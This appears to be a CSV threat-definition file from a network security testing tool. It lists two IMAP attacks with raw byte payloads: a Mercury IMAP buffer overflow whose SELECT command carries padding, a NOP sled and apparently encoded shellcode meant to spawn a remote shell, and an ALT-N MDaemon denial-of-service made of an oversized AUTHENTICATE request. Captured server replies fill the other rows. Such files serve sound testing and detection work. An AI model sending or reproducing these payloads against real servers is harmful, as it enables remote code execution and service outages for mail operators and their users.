XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
Mercury_IMAP_bof.xml,Mercury IMAP Buffer Overflow Attack,"This threat attempts to spawn a shell on a remote machine running Mercury IMAP.  Connects to the IMAP service, which runs on port 143.",IMAP,TCP,a001 SELECT AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||FA C8 F9 01 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 EB 0F ||[||80 ||3||96 ||C||81 3B ||EY4Su||F4 ||t||05 E8 EC FF FF FF ||~||B2 96 96 96 22 EB 83 0E ||]||D4 E1 ||.JK||8C A5 ||-U8P||BD ||+||B8 ||H||C1 E4 ||2||B2 ||$||A4 96 98 CB ||]H||E2 B4 F5 ||^||C9 FC A6 CD F2 1D 95 1D D6 9A 1D E6 8A 3B 1D FE 9E FC 92 CF ||~||12 96 96 96 ||to#||95 BD ||w||FE A5 A4 96 96 FE E1 E5 A4 C9 C2 ||i||C1 ||n||03 FC 93 CF ||~||F1 96 96 96 ||to||1D ||a||C7 FE 94 96 91 ||+||1D ||z||C7 C7 C7 C7 FC 97 FC 94 ||i||C0 ||f||05 FC 86 C3 C5 ||i||C0 ||b||C6 C5 ||i||C0 ||n||1D ||j||FC 98 CF ||=tk||C6 C6 C5 ||i||C0 ||j===||F0 ||Q||D2 B2 BA 97 97 1D ||B||FE F5 FB F2 96 1D ||Z||C5 C6 C1 C4 A5 ||M||C5 C5 C5 FC 97 C5 C5 C7 C5 ||i||C0 ||v||FC ||ii||A1 ||i||C0 ||Ji||C0 ||zi||C0 ||zi||C0 ||~||C7 1D E3 AA 1D E2 B8 EE 95 ||c||C0 1D E0 B6 95 ||c||A5 ||_||DF D7 3B 95 ||S||A5 ||M||A5 ||D||99 ||(||86 AC ||@||E2 9E ||W]||8D 95 ||L||D6 ||}y||AD 89 E3 ||s||C8 1D C8 B2 95 ||K||F0 1D 9A DD 1D C8 8A 95 ||K||1D 92 1D 95 ||S=||CF ||UEY4S||0D 0A||
Mercury_IMAP_bof.xml,Mercury IMAP Buffer Overflow Attack,"This threat attempts to spawn a shell on a remote machine running Mercury IMAP.  Connects to the IMAP service, which runs on port 143.",IMAP,TCP,||2a || ||4f 4b || ||5b ||CAPABI||4c ||ITY I||4d ||AP4rev1 UIDP||4c ||US CHI||4c ||DRE||4e || ||4e ||A||4d ||ESPACE THREAD||3d 4f ||RDEREDSUB||4a ||ECT THREAD||3d ||REFERE||4e ||CES S||4f ||RT QU||4f ||TA ID||4c ||E AC||4c || AC||4c ||2||3d ||U||4e ||I||4f 4e || STARTT||4c ||S||5d 0d 0a||
Mercury_IMAP_bof.xml,Mercury IMAP Buffer Overflow Attack,"This threat attempts to spawn a shell on a remote machine running Mercury IMAP.  Connects to the IMAP service, which runs on port 143.",IMAP,TCP,a01 ||4f 4b || User ||6c 6f ||gged i||6e 0d 0a||
Mercury_IMAP_bof.xml,Mercury IMAP Buffer Overflow Attack,"This threat attempts to spawn a shell on a remote machine running Mercury IMAP.  Connects to the IMAP service, which runs on port 143.",IMAP,TCP,a02 ||4f 4b || ||4c ||IST c||6f 6d ||p||6c ||eted||0d 0a||
Mercury_IMAP_bof.xml,Mercury IMAP Buffer Overflow Attack,"This threat attempts to spawn a shell on a remote machine running Mercury IMAP.  Connects to the IMAP service, which runs on port 143.",IMAP,TCP,||2a || F||4c ||AGS ($||4d ||D||4e ||Se||6e ||t ||4a ||u||6e 6b || ||4e 6f 6e 4a ||u||6e 6b || $F||6f ||rwarded $||4c ||abe||6c ||1 Draft A||6e ||swered F||6c ||agged De||6c ||eted See||6e || Rece||6e ||t)||0d 0a 2a || ||4f 4b || ||5b ||PER||4d ||A||4e ||E||4e ||TF||4c ||AGS ($||4d ||D||4e ||Se||6e ||t ||4a ||u||6e 6b || ||4e 6f 6e 4a ||u||6e 6b || $F||6f ||rwarded $||4c ||abe||6c ||1 ||2a || raft A||6e ||swered F||6c ||agged De||6c ||eted See||6e ||)||5d || ||4c ||i||6d ||ited||0d 0a 2a || 5987 EXISTS||0d 0a 2a || 0 RECE||4e ||T||0d 0a 2a || ||4f 4b || ||5b ||UIDVA||4c ||IDITY 1133912666||5d || ||4f 6b 0d 0a 2a || ||4f 4b || ||5b 4d ||YRIGHTS acdi||6c ||rsw||5d || AC||4c 0d 0a ||a03 ||4f 4b || ||5b ||READ||2d ||WRITE||5d || ||4f 6b 0d 0a||
﻿altn_imap.xml,ALT-N IMAP Daemon Denial of Service,This threat sends a malformed authenticate request to the IMAP daemon of ALT-N's MDaemon software package.  It causes the application to stop responding to IMAP requests.  IMAP servers typically listen on port 143.,IMAP,TCP,a001 AUTHENTICATE CRAM-MD5||0D 0A ||qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq||0D 0A ||qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq||0D 0A||
altn_imap.xml,ALT-N IMAP Daemon Denial of Service,This threat sends a malformed authenticate request to the IMAP daemon of ALT-N's MDaemon software package.  It causes the application to stop responding to IMAP requests.  IMAP servers typically listen on port 143.,IMAP,TCP,||2a || ||4f 4b || ||5b ||CAPABI||4c ||ITY I||4d ||AP4rev1 UIDP||4c ||US CHI||4c ||DRE||4e || ||4e ||A||4d ||ESPACE THREAD||3d 4f ||RDEREDSUB||4a ||ECT THREAD||3d ||REFERE||4e ||CES S||4f ||RT QU||4f ||TA ID||4c ||E AC||4c || AC||4c ||2||3d ||U||4e ||I||4f 4e || STARTT||4c ||S||5d 0d 0a||
altn_imap.xml,ALT-N IMAP Daemon Denial of Service,This threat sends a malformed authenticate request to the IMAP daemon of ALT-N's MDaemon software package.  It causes the application to stop responding to IMAP requests.  IMAP servers typically listen on port 143.,IMAP,TCP,a01 ||4f 4b || User ||6c 6f ||gged i||6e 0d 0a||
altn_imap.xml,ALT-N IMAP Daemon Denial of Service,This threat sends a malformed authenticate request to the IMAP daemon of ALT-N's MDaemon software package.  It causes the application to stop responding to IMAP requests.  IMAP servers typically listen on port 143.,IMAP,TCP,a02 ||4f 4b || ||4c ||IST c||6f 6d ||p||6c ||eted||0d 0a||
altn_imap.xml,ALT-N IMAP Daemon Denial of Service,This threat sends a malformed authenticate request to the IMAP daemon of ALT-N's MDaemon software package.  It causes the application to stop responding to IMAP requests.  IMAP servers typically listen on port 143.,IMAP,TCP,||2a || F||4c ||AGS ($||4d ||D||4e ||Se||6e ||t ||4a ||u||6e 6b || ||4e 6f 6e 4a ||u||6e 6b || $F||6f ||rwarded $||4c ||abe||6c ||1 Draft A||6e ||swered F||6c ||agged De||6c ||eted See||6e || Rece||6e ||t)||0d 0a 2a || ||4f 4b || ||5b ||PER||4d ||A||4e ||E||4e ||TF||4c ||AGS ($||4d ||D||4e ||Se||6e ||t ||4a ||u||6e 6b || ||4e 6f 6e 4a ||u||6e 6b || $F||6f ||rwarded $||4c ||abe||6c ||1 ||2a || raft A||6e ||swered F||6c ||agged De||6c ||eted See||6e ||)||5d || ||4c ||i||6d ||ited||0d 0a 2a || 5987 EXISTS||0d 0a 2a || 0 RECE||4e ||T||0d 0a 2a || ||4f 4b || ||5b ||UIDVA||4c ||IDITY 1133912666||5d || ||4f 6b 0d 0a 2a || ||4f 4b || ||5b 4d ||YRIGHTS acdi||6c ||rsw||5d || AC||4c 0d 0a ||a03 ||4f 4b || ||5b ||READ||2d ||WRITE||5d || ||4f 6b 0d 0a||
